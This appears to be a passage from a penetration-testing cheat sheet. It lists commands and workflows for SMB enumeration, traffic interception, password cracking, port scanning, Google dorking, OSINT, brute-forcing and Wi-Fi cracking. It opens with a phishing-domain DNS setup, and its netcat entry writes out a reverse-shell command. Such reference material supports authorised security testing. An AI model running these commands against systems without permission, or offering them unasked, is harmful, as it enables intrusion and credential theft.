DNS A record: *.phishing-domain.com → YOUR_PUBLIC_IP
HTTPS certificates handled automatically but required
/

# enum4linux-ng
# Windows / SMB enumeration tool
# Extracts: Users | Shares | Policies | Domain Info | System Configuration

### Workflow
# Identify SMB target (NMAP)
# Run basic enumeration
# Attempt anonymous enumeration
# Enumerate users / shares
# Use credentials if available
# Expand to subnet if needed
# Export results for analysis

enum4linux-ng target.com                        - Perform basic enumeration against target
enum4linux-ng -p 445 target.com                 - Specify SMB port (default is 445, usually optional)
enum4linux-ng -A target.com                     - Perform full enumeration (recommended starting point)
enum4linux-ng -U target.com                     - Enumerate users only
enum4linux-ng -S target.com                     - Enumerate SMB shares
enum4linux-ng target.com -o enum_results.txt    - Save output to file
enum4linux-ng -u admin -p password target.com   - Authenticate with credentials for deeper enumeration
enum4linux-ng 192.168.1.0/24                    - Scan entire subnet for SMB enumeration

// Notes
-A is your main command, runs most enumeration checks automatically
Anonymous enumeration depends on SMB configuration (often disabled)
Credentialed scans provide significantly more data
Use alongside Nmap + NetExec for full SMB/AD enumeration
//

# mitmproxy
# Interactive HTTP/HTTPS interception proxy
# Used for: Traffic Inspection | Request Modification | API Testing | Vulnerability Analysis

### Workflow
# Start proxy listener
# Configure browser/device to use proxy
# Install mitmproxy certificate (for HTTPS)
# Intercept and analyze traffic
# Modify requests/responses
# Save and review sessions

mitmproxy                               - Start interactive proxy console
mitmweb                                 - Start web-based interface (GUI)
mitmproxy --mode transparent            - Run in transparent proxy mode (requires network setup)
mitmproxy -w capture_file.mitm          - Save captured traffic to file
mitmproxy -r capture_file.mitm          - Load and replay saved session
mitmproxy --ignore-hosts example.com    - Ignore specific host (do not intercept)
mitmproxy -p 8080                       - Run proxy on specific port
mitmproxy -w exported_flows.mitm        - Export captured flows to file

// Notes
HTTPS requires installing mitmproxy CA certificate on client device
Default proxy runs on 127.0.0.1:8080
Transparent mode requires iptables + routing configuration
Often used alongside Burp Suite for advanced testing
Great for API/mobile app traffic analysis
//

# John the Ripper
# Offline password cracking tool
# Used for: Hash Cracking | Password Recovery | Credential Attacks

### Workflow
# Obtain password hashes (dump, leak, etc.)
# Identify hash type
# Run wordlist attack
# Apply rules / incremental cracking
# Analyze recovered credentials

john hashes.txt                                              - Basic hash cracking
john --wordlist=rockyou.txt hashes.txt                       - Use wordlist for cracking
john --rules hashes.txt                                      - Apply mangling rules to wordlist
john --incremental hashes.txt                                - Brute-force (slow, last resort)
john --show hashes.txt                                       - Display cracked passwords
john --format=NT hashes.txt                                  - Specify hash format (example: NTLM)
john --fork=4 hashes.txt                                     - Use multiple CPU processes
john --session=job1 hashes.txt                               - Save session for later resume
john --restore=job1                                          - Restore previous cracking session

# Notes
# Works best with good wordlists + rules
# Always identify hash type before cracking
# Complements Hydra (online) with offline attacks


# Netcat
Network utility for reading/writing data across connections

Used for: Reverse Shells | Port Listening | Banner Grabbing | Debugging

### Workflow
# Identify target or need (listener / client)
# Open listener or connect to target
# Transfer data or establish shell
# Maintain or escalate access

nc -lvnp 4444                                                - Start listener on port 4444
nc -nv 192.168.1.10 4444                                     - Connect to remote host
nc -zv 192.168.1.10 1-1000                                   - Scan ports (basic)
nc -e /bin/bash 192.168.1.10 4444                            - Reverse shell (may not work on all systems)
nc -lvnp 4444 > file.txt                                     - Receive file
nc 192.168.1.10 4444 < file.txt                              - Send file
nc -lvnp 4444 -k                                             - Persistent listener

### Notes
Some versions disable -e for security (use bash alternatives if needed)
Essential for quick shells and debugging
Often used during exploitation and post-exploitation


# Masscan
# High-speed port scanner
# Used for: Large-scale scanning | Internet-wide discovery | Fast port identification

### Workflow
# Define target range
# Set scan rate carefully
# Scan ports
# Export results
# Feed results into other tools (nmap, httpx)

masscan 192.168.1.0/24 -p80                                  - Scan port 80 on subnet
masscan 192.168.1.0/24 -p1-65535                             - Scan all ports
masscan 192.168.1.0/24 -p80,443,22                           - Scan specific ports
masscan 192.168.1.0/24 --rate 1000                           - Limit scan rate (IMPORTANT)
masscan -iL targets.txt -p80                                 - Scan targets from file
masscan 192.168.1.0/24 -oG masscan.txt                       - Output in grepable format
masscan 192.168.1.0/24 -oX masscan.xml                       - Output in XML format

### Notes
VERY fast but less accurate than Nmap

Always control --rate to avoid network disruption

Best used for discovery, then validate with Nmap


# Google Dorking
# Advanced search techniques using search engine operators
# Used for: OSINT | Sensitive Data Discovery | Exposure Identification

### Workflow
# Define target or data type
# Use search operators
# Refine queries
# Identify exposed data
# Validate findings manually

site:example.com                                             - Search within a specific domain
site:example.com filetype:pdf                                - Find PDF files on target
site:example.com intitle:"index of"                          - Find open directories
site:example.com inurl:admin                                 - Find admin panels
filetype:txt password                                        - Search for exposed password files
intitle:"login" admin                                        - Find login portals
inurl:php?id=                                                - Identify potential SQLi targets
cache:example.com                                            - View cached version of a page
related:example.com                                          - Find related websites

# Notes
# Not a tool, but a critical OSINT skill
# Extremely effective for bug bounty and recon
# Combine with other tools (subfinder, httpx, nuclei)

## Censys
# Internet-wide asset search engine (similar to Shodan)
# Used for: Certificate Search | Host Discovery | Exposure Analysis

# Workflow
Search hosts / domains
Filter results (ports, certs, orgs)
Identify exposed services
Pivot to deeper scanning

censys search "apache"                          - Search for Apache servers
censys host 8.8.8.8                             - View detailed host info
censys certs search example.com                 - Search certificates for domain
censys search "services.port:443"               - Filter by port
censys search "location.country:US"             - Filter by country

# Notes
# Requires API key for full usage
# Complements Shodan


# FOFA
# Internet asset search engine (Chinese-based Shodan alternative)
# Used for: Asset Discovery | Service Enumeration | Global Exposure

### Workflow
# Search using query syntax
# Filter by country / service / port
# Identify targets
# Export results

### Example queries (web UI or API):
```console
app="nginx"                                    - Search nginx servers
port="22"                                      - Find SSH services
country="US"                                   - Filter by country
domain="example.com"                           - Search domain assets
```

### Notes
Web-based tool, not CLI-focused

Strong for global reconnaissance

# DNSDumpster
DNS reconnaissance tool
Used for: Subdomain Discovery | DNS Records | Network Mapping

### Workflow
1. Input domain
2. Enumerate DNS records
3. Identify subdomains and hosts
4. Export findings

Web tool: https://dnsdumpster.com
No CLI by default

### Notes
Good for quick visual recon

Often used alongside Amass / Subfinder


# crt.sh
Certificate transparency log search

Used for: Subdomain Discovery | SSL Certificate Enumeration

### Workflow
1. Search domain
2. Extract subdomains from certificates
3. Feed into recon tools

Web usage
https://crt.sh/?q=example.com

# Notes
# Extremely useful for passive recon
# Often finds hidden subdomains


# Recon-ng
# Modular reconnaissance framework
# Used for: OSINT Automation | Data Correlation | Target Profiling

### Workflow
1. Start framework
2. Add workspace
3. Load modules
4. Run data collection
5. Export results

recon-ng                                      - Launch framework
workspaces create test                        - Create workspace
modules search                                - Search modules
modules load recon/domains-hosts/google_site  - Load module
options set SOURCE example.com                - Set target
run                                           - Execute module
show hosts                                    - View results

### Notes
Similar to Metasploit but for recon

Good for structured OSINT workflows


# ExifTool
# Metadata extraction tool
# Used for: File Metadata Analysis | Forensics | OSINT

### Workflow
# Provide file
# Extract metadata
# Analyze for sensitive info

exiftool file.jpg                             - Extract metadata
exiftool -all file.jpg                        - Show all metadata
exiftool -gps* file.jpg                       - Extract GPS data
exiftool -json file.jpg                       - Output in JSON format

# Notes
# Useful for finding hidden info in images/documents


# Metagoofil
# Document metadata extraction tool
# Used for: OSINT | Username Discovery | Internal Info Leakage

### Workflow
# Define domain
# Download documents
# Extract metadata
# Analyze results

metagoofil -d example.com -t pdf,doc,xls -l 100 -o output/ -f results.html

# Notes
# Often reveals usernames and internal paths


# GitLeaks
# Git repository secret scanner
# Used for: Credential Discovery | Secret Leakage Detection

### Workflow
# Scan repository
# Identify exposed secrets
# Validate findings

gitleaks detect -s .                          - Scan current repo
gitleaks detect -s https://github.com/user/repo - Scan remote repo
gitleaks detect -r report.json                - Output report

# Notes
# Very useful for bug bounty and OSINT


# theHarvester (Already added, but included for completeness)
OSINT collection tool

Used for: Emails | Subdomains | Hosts


# Masscan


# Mitaka
Browser extension for OSINT

Used for: Domain Analysis | Threat Intelligence | Quick Lookups

### Notes
Browser-based (no CLI)

Integrates with multiple OSINT sources


# Wayback Machine
Web archive tool

Used for: Historical Content | Endpoint Discovery | Recon

### Workflow
Search domain
Review archived pages
Identify old endpoints / leaks

### Web usage
https://web.archive.org

### Notes
Great for finding hidden or removed content


# Onionscan
# Tor hidden service analyzer
# Used for: Hidden Service Discovery | Security Analysis

### Workflow
# Provide onion address
# Scan for vulnerabilities
# Analyze results

onionscan http://example.onion

# Notes
# Requires Tor environment
# Niche but valuable


# GeoSpy
Geolocation intelligence tool

Used for: Location Tracking | OSINT Analysis

### Notes
Typically web-based or API-driven

Used in investigations


# Hashcat
Advanced password cracking tool (GPU-based)

Used for: High-speed Hash Cracking

### Workflow
1. Identify hash type
2. Select attack mode
3. Run cracking
4. Analyze results

hashcat -m 1000 -a 0 hashes.txt rockyou.txt    - Wordlist attack (NTLM example)
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a      - Brute-force attack
hashcat --show hashes.txt                     - Show cracked passwords

### Notes
Much faster than John (GPU)

Requires proper configuration


# Medusa
Parallel password brute-force tool

Used for: Network Authentication Attacks

### Workflow
1. Define service
2. Provide credentials
3. Run attack

medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh

###
# Similar to Hydra, less commonly used

# OWASP ZAP
Web application security scanner

Used for: Automated Scanning | Proxying | Vulnerability Detection

### Workflow
1. Start ZAP
2. Configure proxy
3. Scan target
4. Analyze findings

zaproxy                                     - Launch ZAP

### Notes
Free alternative to Burp Suite

Strong automated scanning


# ExploitDB (Searchsploit)
Exploit database search tool

Used for: Finding public exploits

### Workflow
1. Search for exploit
2. Review exploit code
3. Adapt for use

searchsploit apache                          - Search exploits
searchsploit -x exploit_id                   - View exploit details
searchsploit -m exploit_id                   - Copy exploit locally

### Notes
Integrated into Kali Linux


# Aircrack-ng
Wireless security auditing suite

Used for: WiFi Cracking | Packet Capture | Key Recovery

### Workflow
1. Capture packets
2. Analyze traffic
3. Crack key

airmon-ng start wlan0                        - Enable monitor mode
airodump-ng wlan0mon                         - Capture packets
aireplay-ng                                  - Inject packets
aircrack-ng capture.cap                      - Crack password

### Notes
Requires compatible wireless adapter

# Airgeddon
Wireless attack automation framework

Used for: WiFi Attacks | Evil Twin | Credential Capture

### Workflow
1. Start tool
2. Select interface
3. Choose attack mode
4. Execute attack

airgeddon                                    - Launch tool

### Notes
Menu-driven tool
Requires monitor mode support